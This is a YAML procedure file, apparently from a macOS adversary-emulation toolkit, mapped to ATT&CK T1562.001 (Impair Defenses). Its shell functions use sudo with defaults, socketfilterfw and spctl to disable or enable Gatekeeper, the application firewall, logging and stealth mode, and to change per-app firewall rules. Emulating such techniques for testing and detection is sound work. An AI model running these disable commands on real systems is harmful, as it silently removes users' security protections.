procedure_name: modify_fw_settings
ttp_id: T1562.001
tactic: Defense Evasion
guid: 562bfb9d-a679-4384-b5ca-61151e284a55
intent: Modify macOS security settings using defaults, socketfilterfw, and spctl commands
author: '@darmado | https://x.com/darmad0'
version: 1.0.0
created: '2025-01-02'
updated: '2025-06-01'
resources:
- link: https://www.loobins.io/binaries/defaults/
  description: LOOBins defaults commands for Gatekeeper and firewall modification
- link: https://attack.mitre.org/techniques/T1562/001/
  description: MITRE ATT&CK T1562.001 - Impair Defenses Disable or Modify Tools
procedure:
  arguments:
  - option: --gatekeeper
    description: Enable or disable Gatekeeper auto-rearm functionality
    input_required: true
    type: string
    execute_function:
    - gatekeeper_defaults
  - option: --appfw
    description: Enable or disable application firewall globally
    input_required: true
    type: string
    execute_function:
    - appfw_socketfilter
  - option: --appfw-defaults
    description: Enable or disable ALF (Application Layer Firewall) through preferences
    input_required: true
    type: string
    execute_function:
    - appfw_defaults
  - option: --gatekeeper-enforcement
    description: Enable or disable security assessment policy subsystem entirely
    input_required: true
    type: string
    execute_function:
    - gatekeeper_spctl
  - option: --restore-defaults
    description: Restore all security settings to their default enabled state
    execute_function:
    - restore_security_defaults
  - option: --show-fw-settings
    description: Display comprehensive firewall settings and configuration
    execute_function:
    - show_fw_settings
  - option: --setblockall
    description: Block all incoming connections through the firewall
    input_required: true
    type: string
    execute_function:
    - setblockall_fw
  - option: --setstealthmode
    description: Enable or disable firewall stealth mode
    input_required: true
    type: string
    execute_function:
    - setstealthmode_fw
  - option: --setloggingmode
    description: Enable or disable firewall connection logging
    input_required: true
    type: string
    execute_function:
    - setloggingmode_fw
  - option: --blockapp
    description: Block specific application from network access
    input_required: true
    type: string
    execute_function:
    - blockapp_fw
  - option: --unblockapp
    description: Unblock specific application for network access
    input_required: true
    type: string
    execute_function:
    - unblockapp_fw
  - option: --remove
    description: Remove application from firewall rules entirely
    input_required: true
    type: string
    execute_function:
    - remove_fw
  global_variable:
  - name: FILE_GATEKEEPER_PREF
    type: string
    default_value: /Library/Preferences/com.apple.security
  - name: KEY_GATEKEEPER
    type: string
    default_value: GKAutoRearm
  - name: FILE_ALF_PREF
    type: string
    default_value: /Library/Preferences/com.apple.alf
  - name: KEY_ALF_GLOBALSTATE
    type: string
    default_value: globalstate
  - name: CMD_SOCKETFILTERFW
    type: string
    default_value: /usr/libexec/ApplicationFirewall/socketfilterfw
  - name: CMD_DEFAULTS
    type: string
    default_value: defaults
  - name: CMD_SPCTL
    type: string
    default_value: spctl
  - name: CMD_SUDO
    type: string
    default_value: sudo
  - name: INPUT_GATEKEEPER
    type: string
    default_value: ''
  - name: INPUT_APPFW
    type: string
    default_value: ''
  - name: INPUT_APPFW_DEFAULTS
    type: string
    default_value: ''
  - name: INPUT_GATEKEEPER_ENFORCEMENT
    type: string
    default_value: ''
  - name: INPUT_SETBLOCKALL
    type: string
    default_value: ''
  - name: INPUT_SETSTEALTHMODE
    type: string
    default_value: ''
  - name: INPUT_SETLOGGINGMODE
    type: string
    default_value: ''
  - name: INPUT_BLOCKAPP
    type: string
    default_value: ''
  - name: INPUT_UNBLOCKAPP
    type: string
    default_value: ''
  - name: INPUT_REMOVE
    type: string
    default_value: ''
  functions:
  - name: gatekeeper_defaults
    type: main
    language:
    - shell
    code: |
      gatekeeper_defaults() {
          case "$INPUT_GATEKEEPER" in
              enable|on|yes|true|1)
                  local output=$("$CMD_SUDO" "$CMD_DEFAULTS" write "$FILE_GATEKEEPER_PREF" "$KEY_GATEKEEPER" -bool YES 2>&1)
                  $CMD_PRINTF "GATEKEEPER_ENABLE|%s\n" "$output"
                  ;;
              disable|off|no|false|0)
                  local output=$("$CMD_SUDO" "$CMD_DEFAULTS" write "$FILE_GATEKEEPER_PREF" "$KEY_GATEKEEPER" -bool NO 2>&1)
                  $CMD_PRINTF "GATEKEEPER_DISABLE|%s\n" "$output"
                  ;;
              *)
                  $CMD_PRINTF "GATEKEEPER_ERROR|Invalid input: %s. Use enable/disable, on/off, yes/no, true/false, or 1/0\n" "$INPUT_GATEKEEPER"
                  return 1
                  ;;
          esac
      }
  - name: appfw_socketfilter
    type: main
    language:
    - shell
    code: |
      appfw_socketfilter() {
          case "$INPUT_APPFW" in
              enable|on|yes|true|1)
                  local output=$("$CMD_SUDO" "$CMD_SOCKETFILTERFW" --setglobalstate ON 2>&1)
                  $CMD_PRINTF "APPFW_ENABLE|%s\n" "$output"
                  ;;
              disable|off|no|false|0)
                  local output=$("$CMD_SUDO" "$CMD_SOCKETFILTERFW" --setglobalstate OFF 2>&1)
                  $CMD_PRINTF "APPFW_DISABLE|%s\n" "$output"
                  ;;
              *)
                  $CMD_PRINTF "APPFW_ERROR|Invalid input: %s. Use enable/disable, on/off, yes/no, true/false, or 1/0\n" "$INPUT_APPFW"
                  return 1
                  ;;
          esac
      }
  - name: appfw_defaults
    type: main
    language:
    - shell
    code: |
      appfw_defaults() {
          case "$INPUT_APPFW_DEFAULTS" in
              enable|on|yes|true|1)
                  local output=$("$CMD_SUDO" "$CMD_DEFAULTS" write "$FILE_ALF_PREF" "$KEY_ALF_GLOBALSTATE" -int 1 2>&1)
                  $CMD_PRINTF "ALF_ENABLE|%s\n" "$output"
                  ;;
              disable|off|no|false|0)
                  local output=$("$CMD_SUDO" "$CMD_DEFAULTS" write "$FILE_ALF_PREF" "$KEY_ALF_GLOBALSTATE" -int 0 2>&1)
                  $CMD_PRINTF "ALF_DISABLE|%s\n" "$output"
                  ;;
              *)
                  $CMD_PRINTF "ALF_ERROR|Invalid input: %s. Use enable/disable, on/off, yes/no, true/false, or 1/0\n" "$INPUT_APPFW_DEFAULTS"
                  return 1
                  ;;
          esac
      }
  - name: gatekeeper_spctl
    type: main
    language:
    - shell
    code: |
      gatekeeper_spctl() {
          case "$INPUT_GATEKEEPER_ENFORCEMENT" in
              enable|on|yes|true|1)
                  local output=$("$CMD_SUDO" "$CMD_SPCTL" --master-enable 2>&1)
                  $CMD_PRINTF "SPCTL_ENABLE|%s\n" "$output"
                  ;;
              disable|off|no|false|0)
                  local output=$("$CMD_SUDO" "$CMD_SPCTL" --master-disable 2>&1)
                  $CMD_PRINTF "SPCTL_DISABLE|%s\n" "$output"
                  ;;
              *)
                  $CMD_PRINTF "SPCTL_ERROR|Invalid input: %s. Use enable/disable, on/off, yes/no, true/false, or 1/0\n" "$INPUT_GATEKEEPER_ENFORCEMENT"
                  return 1
                  ;;
          esac
      }
  - name: restore_security_defaults
    type: main
    language:
    - shell
    code: |
      restore_security_defaults() {
          local output=$("$CMD_SUDO" "$CMD_DEFAULTS" write "$FILE_GATEKEEPER_PREF" "$KEY_GATEKEEPER" -bool YES 2>&1)
          $CMD_PRINTF "GATEKEEPER: %s\n" "$output"
          local output=$("$CMD_SUDO" "$CMD_SOCKETFILTERFW" --setglobalstate on 2>&1)
          $CMD_PRINTF "appfw: %s\n" "$output"
          local output=$("$CMD_SUDO" "$CMD_DEFAULTS" write "$FILE_ALF_PREF" "$KEY_ALF_GLOBALSTATE" -int 1 2>&1)
          $CMD_PRINTF "ALF|%s\n" "$output"
      }
  - name: show_fw_settings
    type: main
    language:
    - shell
    code: |
      show_fw_settings() {
          local output=$("$CMD_SOCKETFILTERFW" --getglobalstate 2>&1)
          $CMD_PRINTF "FIREWALL_GLOBAL|%s\n" "$output"
          local output=$("$CMD_SOCKETFILTERFW" --getblockall 2>&1)
          $CMD_PRINTF "FIREWALL_BLOCKALL|%s\n" "$output"
          local output=$("$CMD_SOCKETFILTERFW" --listapps 2>&1)
          $CMD_PRINTF "FIREWALL_APPS|%s\n" "$output"
          local output=$("$CMD_SOCKETFILTERFW" --getallowsigned 2>&1)
          $CMD_PRINTF "FIREWALL_ALLOWSIGNED|%s\n" "$output"
          local output=$("$CMD_SOCKETFILTERFW" --getstealthmode 2>&1)
          $CMD_PRINTF "FIREWALL_STEALTH|%s\n" "$output"
          local output=$("$CMD_SOCKETFILTERFW" --getloggingmode 2>&1)
          $CMD_PRINTF "FIREWALL_LOGGING|%s\n" "$output"
          local output=$("$CMD_SOCKETFILTERFW" --getloggingopt 2>&1)
          $CMD_PRINTF "FIREWALL_LOGOPT|%s\n" "$output"
      }
  - name: setblockall_fw
    type: main
    language:
    - shell
    code: |
      setblockall_fw() {
          # Convert input to uppercase ON/OFF format required by socketfilterfw
          local socketfilter_input=""
          case "$INPUT_SETBLOCKALL" in
              enable|on|yes|true|1)
                  socketfilter_input="ON"
                  ;;
              disable|off|no|false|0)
                  socketfilter_input="OFF"
                  ;;
              ON|OFF)
                  socketfilter_input="$INPUT_SETBLOCKALL"
                  ;;
              *)
                  $CMD_PRINTF "FIREWALL_BLOCKALL_ERROR|Invalid input: %s. Use ON/OFF, enable/disable, on/off, yes/no, true/false, or 1/0\n" "$INPUT_SETBLOCKALL"
                  return 1
                  ;;
          esac
          local output=$("$CMD_SUDO" "$CMD_SOCKETFILTERFW" --setblockall "$socketfilter_input" 2>&1)
          $CMD_PRINTF "FIREWALL_BLOCKALL|%s\n" "$output"
      }
  - name: setstealthmode_fw
    type: main
    language:
    - shell
    code: |
      setstealthmode_fw() {
          # Convert input to uppercase ON/OFF format required by socketfilterfw
          local socketfilter_input=""
          case "$INPUT_SETSTEALTHMODE" in
              enable|on|yes|true|1)
                  socketfilter_input="ON"
                  ;;
              disable|off|no|false|0)
                  socketfilter_input="OFF"
                  ;;
              ON|OFF)
                  socketfilter_input="$INPUT_SETSTEALTHMODE"
                  ;;
              *)
                  $CMD_PRINTF "FIREWALL_STEALTH_ERROR|Invalid input: %s. Use ON/OFF, enable/disable, on/off, yes/no, true/false, or 1/0\n" "$INPUT_SETSTEALTHMODE"
                  return 1
                  ;;
          esac
          local output=$("$CMD_SUDO" "$CMD_SOCKETFILTERFW" --setstealthmode "$socketfilter_input" 2>&1)
          $CMD_PRINTF "FIREWALL_STEALTH|%s\n" "$output"
      }
  - name: setloggingmode_fw
    type: main
    language:
    - shell
    code: |
      setloggingmode_fw() {
          # Convert input to uppercase ON/OFF format required by socketfilterfw
          local socketfilter_input=""
          case "$INPUT_SETLOGGINGMODE" in
              enable|on|yes|true|1)
                  socketfilter_input="ON"
                  ;;
              disable|off|no|false|0)
                  socketfilter_input="OFF"
                  ;;
              ON|OFF)
                  socketfilter_input="$INPUT_SETLOGGINGMODE"
                  ;;
              *)
                  $CMD_PRINTF "FIREWALL_LOGGING_ERROR|Invalid input: %s. Use ON/OFF, enable/disable, on/off, yes/no, true/false, or 1/0\n" "$INPUT_SETLOGGINGMODE"
                  return 1
                  ;;
          esac
          local output=$("$CMD_SUDO" "$CMD_SOCKETFILTERFW" --setloggingmode "$socketfilter_input" 2>&1)
          $CMD_PRINTF "FIREWALL_LOGGING|%s\n" "$output"
      }
  - name: blockapp_fw
    type: main
    language:
    - shell
    code: |
      blockapp_fw() {
          local output=$("$CMD_SUDO" "$CMD_SOCKETFILTERFW" --blockapp "$INPUT_BLOCKAPP" 2>&1)
          $CMD_PRINTF "FIREWALL_BLOCKAPP|%s\n" "$output"
      }
  - name: unblockapp_fw
    type: main
    language:
    - shell
    code: |
      unblockapp_fw() {
          local output=$("$CMD_SUDO" "$CMD_SOCKETFILTERFW" --unblockapp "$INPUT_UNBLOCKAPP" 2>&1)
          $CMD_PRINTF "FIREWALL_UNBLOCKAPP|%s\n" "$output"
      }
  - name: remove_fw
    type: main
    language:
    - shell
    code: |
      remove_fw() {
          local output=$("$CMD_SUDO" "$CMD_SOCKETFILTERFW" --remove "$INPUT_REMOVE" 2>&1)
          $CMD_PRINTF "FIREWALL_REMOVE|%s\n" "$output"
      } 